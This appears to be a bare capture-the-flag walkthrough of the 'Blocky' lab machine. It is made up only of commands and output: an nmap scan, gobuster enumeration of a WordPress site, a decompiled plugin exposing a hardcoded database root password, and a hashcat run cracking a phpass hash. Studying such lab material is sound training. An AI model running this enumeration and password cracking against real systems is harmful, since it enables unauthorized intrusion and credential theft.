
```bash
nmap -sV -sC 10.129.16.90
```
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-23 05:33 -0400
Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 05:36 (0:00:00 remaining)
Nmap scan report for 10.129.16.90
Host is up (0.41s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp?
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.59 seconds
```

```bash
vi /etc/hosts
```
(pic)



```bash
gobuster dir -u http://blocky.htb -w /usr/share/wordlists/dirb/big.txt
```
```bash
===============================================================
[+] Url:                     http://blocky.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 294]
.htaccess            (Status: 403) [Size: 294]
javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
server-status        (Status: 403) [Size: 298]
wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
cat BlockyCore.java
```
```bash
package com.myfirstplugin;

/* JADX INFO: loaded from: BlockyCore.class */
public class BlockyCore {
    public String sqlHost = "localhost";
    public String sqlUser = "root";
    public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";

    public void onServerStart() {
    }

    public void onServerStop() {
    }

    public void onPlayerJoin() {
        sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
    }

    public void sendMessage(String username, String message) {
    }
}
```

```bash
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
```bash
Session..........: hashcat
Status...........: Running
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/
Time.Started.....: Mon Oct 26 02:09:35 2026 (1 min, 35 secs)
Time.Estimated...: Mon Oct 26 02:51:59 2026 (40 mins, 49 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     5636 H/s (11.82ms) @ Accel:74 Loops:1024 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 536944/14344385 (3.74%)
Rejected.........: 0/536944 (0.00%)
Restore.Point....: 536944/14344385 (3.74%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:4096-5120
Candidate.Engine.: Device Generator
Candidates.#01...: afatsum -> abbey05
Hardware.Mon.#01.: Util: 90%
```










